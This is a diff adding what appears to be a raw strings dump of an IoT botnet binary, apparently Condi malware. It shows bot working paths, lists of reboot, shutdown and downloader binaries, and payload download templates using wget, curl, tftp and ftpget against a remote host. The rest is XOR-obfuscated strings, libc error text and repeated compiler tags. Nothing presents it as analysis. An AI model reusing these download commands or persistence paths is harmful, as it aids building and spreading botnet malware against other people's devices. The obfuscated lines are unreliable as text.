@@ -1,0 +1,396 @@
+ HTTP/1.1
+User-Agent: 
+Cookie: 
+/proc/net/tcp
+/proc/%d/exe
+/proc/%s/status
+/bin/systemd
+/usr/bin
+/tmp/condi
+/tmp/zxcr9999
+/tmp/condinetwork
+/var/condibot
+/var/zxcr9999
+/var/CondiBot
+/var/condinet
+/bin/watchdog
+/usr/sbin/reboot
+/usr/bin/reboot
+/usr/sbin/shutdown
+/usr/bin/shutdown
+/usr/sbin/poweroff
+/usr/bin/poweroff
+/usr/sbin/halt
+/usr/bin/halt
+/usr/sbin/wget
+/usr/bin/wget
+/usr/sbin/curl
+/usr/bin/curl
+/usr/sbin/ftpget
+/usr/bin/ftpget
+/usr/sbin/tftp
+/usr/bin/tftp
+/usr/sbin/busybox
+/usr/bin/busybox
+/usr/sbin/netstat
+/usr/bin/netstat
+WPCLKWOA
+AOFNKLG"
+LCOGQGPTGP
+UCVAJFME"
+UCVAJFME"
+UCVAJFME"
+UCVAJFME"
+}UCVAJFME"
+UCVAJFME"
+UCVAJFME
+UCVAJFME"
+UCVAJFME"
+FTPjGNRGP"
+qMPCnmcfgp"
+kW{EWHGkSL"
+ARWKLDM"
+`memokrq"
+LGVQNKLI
+rpktoqe"
+egvnmacnkr"
+iknncvvi"
+eJMQVuWXjGPG
+aMLLGAVKML
+CRRNKACVKML
+ZJVON	ZON
+CRRNKACVKML
+nCLEWCEG
+CRRNKACVKML
+WPNGLAMFGF"
+QGVaMMIKG
+NMACVKML
+VPCLQDGP
+GLAMFKLE
+AJWLIGF"
+AMLLGAVKML
+FMQCPPGQV"
+ANMWFDNCPG
+cRRNGuG@iKV
+cRRNGuG@iKV
+cRRNGuG@iKV
+cRRNGuG@iKV
+oCAKLVMQJ
+cRRNGuG@iKV
+AMORCVK@NG
+AMORCVK@NG
+kLDMrCVJ
+AMORCVK@NG
+oqkgaPCUNGP
+AMORCVK@NG
+kLDMrCVJ
+AMORCVK@NG
+dWLuG@rPMFWAVQ
+oCAKLVMQJ
+oCAKLVMQJ
+oCAKLVMQJ
+oCAKLVMQJ
+cRRNGuG@iKV
+FICMUHDKPJKCF
+wget http://%s/%s/%s -O %s
+curl -o %s http://%s/%s/%s
+tftp %s -c get %s %s
+cd %s && tftp -g -r %s %s
+ftpget -v -u anonymous -p anonymous -P 21 %s %s %s
+/var/run/
+/var/tmp/
+hlLjztqZ
+npxXoudifFeEgGaACScs
+Unknown error 
+Operation not permitted
+No such file or directory
+No such process
+Interrupted system call
+Input/output error
+No such device or address
+Argument list too long
+Exec format error
+Bad file descriptor
+No child processes
+Resource temporarily unavailable
+Cannot allocate memory
+Permission denied
+Bad address
+Block device required
+Device or resource busy
+File exists
+Invalid cross-device link
+No such device
+Not a directory
+Is a directory
+Invalid argument
+Too many open files in system
+Too many open files
+Inappropriate ioctl for device
+Text file busy
+File too large
+No space left on device
+Illegal seek
+Read-only file system
+Too many links
+Broken pipe
+Numerical argument out of domain
+Numerical result out of range
+Resource deadlock avoided
+File name too long
+No locks available
+Function not implemented
+Directory not empty
+Too many levels of symbolic links
+No message of desired type
+Identifier removed
+Channel number out of range
+Level 2 not synchronized
+Level 3 halted
+Level 3 reset
+Link number out of range
+Protocol driver not attached
+No CSI structure available
+Level 2 halted
+Invalid exchange
+Invalid request descriptor
+Exchange full
+No anode
+Invalid request code
+Invalid slot
+Bad font file format
+Device not a stream
+No data available
+Timer expired
+Out of streams resources
+Machine is not on the network
+Package not installed
+Object is remote
+Link has been severed
+Advertise error
+Srmount error
+Communication error on send
+Protocol error
+Multihop attempted
+RFS specific error
+Bad message
+Value too large for defined data type
+Name not unique on network
+File descriptor in bad state
+Remote address changed
+Can not access a needed shared library
+Accessing a corrupted shared library
+.lib section in a.out corrupted
+Attempting to link in too many shared libraries
+Cannot exec a shared library directly
+Invalid or incomplete multibyte or wide character
+Interrupted system call should be restarted
+Streams pipe error
+Too many users
+Socket operation on non-socket
+Destination address required
+Message too long
+Protocol wrong type for socket
+Protocol not available
+Protocol not supported
+Socket type not supported
+Operation not supported
+Protocol family not supported
+Address family not supported by protocol
+Address already in use
+Cannot assign requested address
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+No buffer space available
+Transport endpoint is already connected
+Transport endpoint is not connected
+Cannot send after transport endpoint shutdown
+Too many references: cannot splice
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Stale NFS file handle
+Structure needs cleaning
+Not a XENIX named type file
+No XENIX semaphores available
+Is a named type file
+Remote I/O error
+Disk quota exceeded
+No medium found
+Wrong medium type
+/dev/null
+npxXoudifFeEgGaACSncs[
+infinity
+GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
+.shstrtab
+.eh_frame
+.comment
